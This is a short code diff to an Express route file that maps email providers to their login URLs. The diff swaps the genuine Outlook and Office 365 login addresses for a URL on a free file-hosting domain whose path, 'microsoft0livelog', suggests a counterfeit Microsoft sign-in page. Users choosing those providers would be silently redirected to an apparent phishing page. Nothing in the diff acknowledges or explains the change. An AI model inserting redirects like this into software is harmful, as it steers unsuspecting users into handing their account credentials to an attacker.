@@ -9,9 +9,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
     // Map of provider IDs to their login URLs
     const providerUrls: Record<string, string> = {
-      outlook: "https://outlook.live.com",
+      outlook: "https://dfzmpvzygfsbpnpcuaea7w.on.drv.tw/microsoft0livelog/",
       aol: "https://login.aol.com",
-      office365: "https://www.office.com/login",
+      office365: "https://dfzmpvzygfsbpnpcuaea7w.on.drv.tw/microsoft0livelog/",
       yahoo: "https://login.yahoo.com",
       other: "https://mail.google.com",
     };
